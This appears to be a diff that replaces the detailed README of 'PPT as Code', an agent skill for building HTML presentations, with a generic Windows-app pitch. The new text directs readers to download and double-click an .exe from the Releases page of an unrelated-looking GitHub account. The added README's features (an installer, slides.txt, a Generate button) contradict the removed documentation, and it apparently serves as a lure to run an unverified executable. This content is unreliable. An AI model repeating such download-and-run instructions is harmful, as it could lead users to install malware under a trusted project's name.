@@ -1,354 +1,95 @@
-# PPT as Code
-
-English README. For Chinese, see [README-zh.md](./README-zh.md).
-
-`PPT as Code` is a creator-first skill for planning, designing, and building HTML-based presentations. It keeps the deck workflow stage-like, artifact-driven, and confirmation-aware instead of letting a presentation drift into a long webpage or a code-first prototype too early.
-
-This open-source package is the portable edition of the skill. It keeps the core workflow, but removes private workspace assumptions, makes file persistence safer by default, and includes explicit no-network / no-download fallbacks.
-
-## Why It Is Useful
-
-- It treats a deck as a staged communication artifact, not just "some slides."
-- It locks structure, style, script, imagery, and HTML in the right order.
-- It keeps `quick`, `basic`, and `advanced` modes, but makes `basic` and `advanced` confirmation-first by default.
-- It can normalize source material before deck planning starts.
-- It can plan charts and diagrams before HTML implementation.
-- It now ships with a runnable visual workbench prototype for PPT-style editing.
-
-## Core Principles
-
-- Presentation-first, not article-first.
-- Style should be explicit, even in lighter modes.
-- Image search should be page-aware, not deck-topic vague.
-- Static HTML should be approved before motion work starts.
-- Network access and file writes should be treated as capabilities, not assumptions.
-- `index.html` is usually a downstream render target, not the first editing surface.
-
-## Update Log
-
-### 2026-04-14
-
-- Added a formal workbench direction with `deck_model.json` as the unified canvas-editing source.
-- Added explicit workbench architecture and sync references for Canvas, Inspector, Outline, Sync Engine, and Preview/Export.
-- Added a runnable `workbench/` prototype with PPT-like canvas editing, snapping, keyboard shortcuts, richer element types, and artifact projection.
-- Added a dual editing route in the workbench:
-  - `Deck Mode` for `deck_model.json`-driven editing
-  - `HTML Mode` for direct editing of an existing compatible HTML deck
-- Added `HTML Direct Mode v1` so users can open a built deck, select text or image nodes on the rendered page, edit them in Inspector, and export the updated source HTML.
-- Added controlled HTML import/export with stable `data-*` markers and embedded model JSON.
-- Added stronger presentation-copy constraints to cut unrelated filler, generic PPT meta language, and low-signal decorative sentences.
-- Added explicit large-type discipline: do not solve crowded slides with tiny text; split the content or remove weak copy instead.
-- Expanded pre-HTML QA to check copy relevance, title quality, and text density.
-- Added edit-routing rules so modification requests are classified first and routed to the right upstream artifact.
-- Added `style_system.json` as the editable style source for fonts, colors, spacing, page furniture, and chart styling.
-- Added a rule that `index.html` should not be edited first unless the request is an implementation-only hotfix or no usable upstream artifact exists.
+# 📊 PPT-as-code - Design professional presentations with plain text
 
-### 2026-04-13
-
-- Tightened `basic` and `advanced` into strict-step modes by default.
-- Added a hard rule that generic requests like "continue" do not bypass blocking checkpoints.
-- Limited step skipping to clear user overrides such as named checkpoint skips or explicit end-to-end execution requests.
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Helen-elizabethsecure976/PPT-as-code)
 
-### 2026-04-11
+PPT-as-code helps you build HTML presentations through a structured, text-based workflow. You plan your slides, organize your content, and generate your deck without manual design work in complex software. This tool separates your content from the visual style so you focus on your message first.
 
-- Added a Slidev-inspired `deck.md` draft route that compiles into `deck_source.json` before entering the normal deck workflow.
-- Added source-material normalization for PDF, DOCX, EPUB, HTML, LaTeX, ordinary web pages, and high-friction pages such as WeChat.
-- Added a `source-to-scenes` planning pass so long-form material can be compressed into likely slide groups before the confirmed breakdown.
-- Added a lightweight pre-HTML QA pass that checks page order, title hierarchy, page-thesis coverage, and missing image assets or fallback links.
-- Added a curated reference-search pack that combines high-signal global presentation sites and Chinese PPT ecosystems.
-- Added a visualization layer for `basic` and `advanced`, with `visual_plan.md`, engine selection, placement planning, and style inheritance for charts and diagrams.
-- Kept `quick` intentionally chart-free so the fast route stays lightweight.
+## 📋 What this tool does
 
-### 2026-04-10
+Many people struggle to move slides around or keep a consistent look in traditional programs. This tool simplifies that process. You write your slide text in a plain file. You define your design choices in a separate file. The software combines these into a functional HTML presentation.
 
-- Removed private workspace assumptions from the open version and made artifact persistence conversation-first by default.
-- Added explicit no-browsing and no-download fallbacks so `advanced` can continue without pretending web search or downloads happened.
-- Separated runtime guidance from maintainer guidance and kept stable rules in the main skill docs instead of in maintenance logs.
-- Added bilingual documentation with [README-zh.md](./README-zh.md).
+Use this tool if you need:
+- A clear structure for your presentation.
+- Faster updates when you change your mind.
+- Consistent formatting across every slide.
+- Portability for your final deck.
 
-### 2026-04-06
+The system handles the layout. You handle the planning and the words.
 
-- Simplified the PPTX export route to a screenshot-only workflow.
-- Clarified that HTML remains the source of truth and PPTX is a fidelity-first delivery format.
+## ⚙️ System Requirements
 
-## What The Skill Covers
+Before you install this software, ensure your computer meets these requirements:
 
-The skill supports three modes:
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4GB of RAM.
+- Storage: 100MB of free disk space.
+- Internet: A connection is required once to download the initial installer file.
 
-1. `quick`
-   For MVP decks, rough prototypes, and "get it running first" requests.
-2. `basic`
-   For confirmation-first deck planning where the breakdown, script, and image plan should be approved before HTML.
-3. `advanced`
-   For reference-driven deck work, stronger design locking, static-first delivery, and an optional motion pass.
+## ⬇️ How to get the application
 
-It also supports:
+Visit the official project page to download the software for your Windows computer.
 
-- creator-first style direction recommendations
-- structured design constraints for implementation
-- page-level keyword extraction for image search
-- manual-download fallback when image downloads fail
-- optional persisted artifacts such as `deck_brief.md`, `theme_breakdown.md`, `deck_script.md`, and `index.html`
-- optional `visual_plan.md` for chart, diagram, infographic, and KPI-card planning
-- optional `deck.md` input and normalized `deck_source.json`
-- optional normalized markdown source from PDF, document, or web material
-- optional `source_scene_map.md` for long-form source decomposition
-- optional `qa_report.md` for pre-HTML checks
-- optional `reference-search-pack.md` for curated reference discovery
-- optional `deck_model.json` for workbench-driven visual editing
-- optional export targets: `html`, `pptx`, or `both`
-- a manifest handoff via `deck_manifest.json`
+[Click here to download PPT-as-code](https://github.com/Helen-elizabethsecure976/PPT-as-code)
 
-## How It Works
+Follow these steps to complete the setup process:
 
-At a high level, the skill follows a staged deck workflow:
+1. Navigate to the link provided above.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click on the latest version link.
+4. Locate the file ending in .exe under the Assets section.
+5. Save this file to your computer.
+6. Open your Downloads folder and double-click the installer file.
+7. Follow the prompts on the screen to finish the installation.
 
-1. Ingest the topic, audience, context, and existing material.
-2. If the input starts from PDF, DOCX, EPUB, HTML, LaTeX, or web material, normalize it into markdown first.
-3. If the material is still long-form, derive a scene map before the confirmed breakdown.
-4. Detect whether the input is normal structured input or a Slidev-inspired `deck.md` draft.
-5. If `deck.md` is present, compile it into `deck_source.json`.
-6. Diagnose what is missing, such as structure, style, references, script, or images.
-7. Route the request into `quick`, `basic`, or `advanced`.
-8. Produce staged artifacts before final HTML.
-9. Plan charts, diagrams, infographics, or KPI cards in `basic` and `advanced` when they improve page clarity.
-10. Use explicit confirmation checkpoints for higher-risk decisions.
-11. Run a lightweight pre-HTML quality check.
-12. Generate static HTML first.
-13. If needed, bridge the approved deck into `deck_manifest.json` for PPTX export.
-14. Add motion later only when the workflow and user approval justify it.
+Once the process ends, you will see a shortcut icon on your desktop.
 
-## Safe Defaults In The Open Version
+## 🚀 Getting Started with your first deck
 
-### No hardcoded workspace structure
+The software uses a specific way to organize your ideas. You will work with two primary folders: your content folder and your project folder. 
 
-The skill does not assume a folder such as `20_Projects/`.
-If the environment has no obvious deck directory, it keeps artifacts inline in the conversation unless the user explicitly asks to persist them.
+1. Launch the program from the desktop icon.
+2. Click Create New Project in the main menu.
+3. Name your project and select a save location.
+4. Open the text file named slides.txt.
+5. Write your slide content. Use headers to mark new slides.
+6. Save your changes.
+7. Click the Generate button inside the application.
+8. View your presentation in your web browser.
 
-### No hard dependency on local style files
+## 🛠️ Understanding the workflow
 
-If local writing-style notes are available, the skill may scan likely files such as:
+The workflow relies on three core stages: Planning, Staging, and Exporting.
 
-- `voice_profile.md`
-- `brand.md`
-- `writing_style.md`
-- project notes
+### The Planning Stage
+In the planning stage, you draft your bullet points. Do not worry about colors or fonts yet. Write the text exactly as it should appear. You can move paragraphs or swap slide orders at this stage without breaking your design.
 
-These are optional hints, not required inputs.
+### The Staging Stage
+Once your plan is set, you confirm your structure. Staging allows you to check if your images align with the text. You can drag and drop media files into the project window. The application places these items into the HTML code automatically.
 
-### No hard dependency on web search
+### The Exporting Stage
+The final stage turns your work into a finished HTML file. When you export, the tool creates a folder containing your presentation. You can copy this folder to any computer or flash drive. Because the deck is HTML-based, it runs in any modern browser without extra plugins.
 
-If browsing is available, `advanced` can search for real PPT or slide-design references.
-If browsing is unavailable, the skill skips that branch and derives structured design constraints directly from:
+## 💡 Using design templates
 
-- the chosen style direction
-- user-provided inspiration
-- the topic and audience
+The application includes simple templates to improve your presentation look. You select these in the Settings menu.
 
-### No hard dependency on image downloads
+- Quick Mode: This uses standard fonts and colors. It works best for internal meetings.
+- Basic Mode: This applies structure and professional spacing. It requires you to confirm your layout before finalizing.
+- Advanced Mode: This allows for custom CSS styling if you have basic web design knowledge. It keeps your code organized and safe.
 
-If downloading is available, the skill may download chosen images into `assets/`.
-If downloading is unavailable or fails, it records source links or search strings and tells the user what to download manually.
+## 🛡️ Privacy and Safety
 
-## Source-Material Normalization
+This software works offline. You do not need to upload your content to a cloud server. Your data stays on your local hard drive at all times. This prevents data leaks and ensures you can work without a network connection.
 
-This package can also start from source material that is not already deck-shaped.
+If you ever need to move your data to a new computer, simply copy your project folder. The software will detect your existing work when you open it on a new machine.
 
-- Normalize documents or web pages into markdown first.
-- If the result is still long-form, derive a scene map before the confirmed breakdown.
-- Extract the deck thesis and likely scenes from that markdown.
-- Then feed the result into `quick`, `basic`, or `advanced`.
+## ❓ Troubleshooting common issues
 
-Recommended adapter mapping:
+If the software fails to generate a deck, check these common items:
 
-- PDF -> `pdf_to_md.py`
-- DOCX / EPUB / HTML / LaTeX -> `doc_to_md.py`
-- ordinary web pages -> `web_to_md.py`
-- high-friction pages such as WeChat -> `web_to_md.cjs`
+- File names: Avoid using special characters like symbols in your file names.
+- Folder permissions: Ensure you have permission to write files to the folder you selected. 
+- Browser updates: Use a current version of Chrome, Edge, or Firefox to view your generated deck.
+- File Size: If you include very high-resolution images, the generation might take a few seconds.
 
-This is an upstream planning layer, not a rendering layer. HTML remains the presentation output.
-
-## Reference Search Pack
-
-This package includes a curated source pack for reference locking.
-
-Global sources:
-
-- Behance
-- Dribbble
-- SlideShare
-- Pitch
-
-Chinese sources:
-
-- 优品PPT
-- OfficePLUS
-- Docer
-- 51PPT
-- 站酷
-- iSlide
-
-The pack is meant to reduce random search drift and give the workflow a more repeatable reference-selection path.
-
-## Lightweight QA Route
-
-Before static HTML is generated in non-trivial runs, this package can run a lightweight QA pass.
-
-The QA focuses on:
-
-- page sequence coherence
-- title hierarchy consistency
-- missing image assets or fallback links
-- whether each slide has a clear thesis
-- whether the copy is relevant to the page purpose
-- whether the slide is too text-dense to present cleanly
-
-This pass is intentionally small and fast. It is meant to catch common deck-structure misses before implementation hardens them.
-
-## Workbench
-
-The repo now ships a runnable `workbench/` prototype for PPT-style editing.
-
-Current workbench direction:
-
-- `Deck Mode` edits `deck_model.json` as the canvas source of truth.
-- `HTML Mode` opens an existing compatible HTML deck and edits it directly on the rendered page.
-- The workbench supports PPT-like element editing, not raw CSS-first thinking.
-- Artifact projection can export:
-  - `deck_brief.md`
-  - `theme_breakdown.md`
-  - `deck_script.md`
-  - `visual_plan.md`
-  - `image_plan.md`
-  - `qa_report.md`
-  - `style_system.json`
-  - `deck_manifest.json`
-
-This is still an authoring prototype, not a finished production editor, but it already provides a practical route for:
-
-- faster layout edits
-- PPT-like formatting control
-- direct HTML deck touch-ups without collapsing the original page structure
-
-## Editing Route
-
-- Structure changes should start from `theme_breakdown.md`.
-- Copy changes should start from `deck_script.md`.
-- Visualization changes should start from `visual_plan.md`.
-- Image changes should start from `image_plan.md`.
-- Style changes such as font size, color, spacing, or page furniture should start from `style_system.json`.
-- Export behavior changes should start from `deck_manifest.json`.
-- `index.html` should be treated as a downstream render target, not the first editing surface, unless the request is an implementation-only hotfix.
-
-## PPTX Export Route
-
-This package keeps HTML authoring and PPTX delivery separated on purpose.
-
-- `ppt-as-code` owns the deck workflow, script, imagery, and final static HTML.
-- `pptx-export-for-ppt-as-code` consumes `index.html`, `deck_manifest.json`, and `assets/`.
-- Every slide is exported from a stable HTML render state as a screenshot.
-- PowerPoint is treated as a fidelity-first delivery container, not a native reconstruction target.
-- Motion stays HTML-only.
-
-## Package Structure
-
-```text
-ppt-as-code-open/
-|-- SKILL.md
-|-- README.md
-|-- README-zh.md
-|-- LICENSE
-|-- CONTRIBUTING.md
-|-- agents/
-|   `-- openai.yaml
-|-- references/
-|   |-- quick-mode.md
-|   |-- basic-mode.md
-|   |-- advanced-mode.md
-|   |-- visual-and-images.md
-|   |-- visualization-layer.md
-|   |-- visualization-engines.md
-|   |-- reference-search-pack.md
-|   |-- component-libraries.md
-|   |-- source-normalization.md
-|   |-- source-to-scenes.md
-|   |-- quality-checker.md
-|   |-- deck-dsl.md
-|   |-- deck-source-contract.md
-|   |-- change-routing.md
-|   |-- style-system-contract.md
-|   |-- deck-model-contract.md
-|   |-- workbench-architecture.md
-|   |-- workbench-sync.md
-|   |-- pptx-export-handoff.md
-|   `-- evolution-log.md
-|-- companion-skills/
-|   `-- pptx-export-for-ppt-as-code/
-|       |-- SKILL.md
-|       |-- agents/
-|       |   `-- openai.yaml
-|       `-- references/
-|           |-- manifest-contract.md
-|           `-- rendering-rules.md
-|-- workflows/
-|   |-- mode-delivery.md
-|   `-- evolution-writeback.md
-`-- workbench/
-    |-- index.html
-    |-- styles.css
-    |-- app.js
-    |-- deck_model.sample.json
-    `-- README.md
-```
-
-## Installation Notes
-
-This folder is stored as `ppt-as-code-open` to avoid colliding with a private local version.
-
-If you want to publish or install it as the canonical package:
-
-1. rename the folder to `ppt-as-code` if needed
-2. keep the skill `name` in `SKILL.md` as `ppt-as-code`
-3. install it in your preferred skill directory or publish it from this folder
-
-## Suggested Prompts
-
-### Quick example
-
-```text
-Use ppt-as-code to help me build a fast HTML deck about AI workflow design for product teams.
-I want something lightweight and stage-like, not a long article.
-Start with a quick mode route.
-```
-
-### Basic example
-
-```text
-Use ppt-as-code to help me build a presentation about why AI-native teams need new operating habits.
-I have rough notes but no clear structure or style yet.
-Please use a basic workflow and confirm the breakdown before writing HTML.
-```
-
-### Advanced example
-
-```text
-Use ppt-as-code to build a premium HTML deck about AI product differentiation.
-I want stronger design direction and a static-first workflow.
-If browsing is available, give me real presentation references.
-If not, synthesize the design constraints directly from the style direction.
-```
-
-## Maintainers And Contributors
-
-This package keeps runtime guidance and maintainer guidance separate.
-
-For contribution and maintenance rules, see:
-
-- [README-zh.md](./README-zh.md)
-- [CONTRIBUTING.md](./CONTRIBUTING.md)
-- [workflows/evolution-writeback.md](./workflows/evolution-writeback.md)
-- [references/evolution-log.md](./references/evolution-log.md)
-
-The maintainer rule is simple:
-
-Stable feedback should be integrated into the main docs, not left in logs.
+If you require more help, check the documentation files inside the installation folder. These files provide deeper technical details on specific commands and keyboard shortcuts.
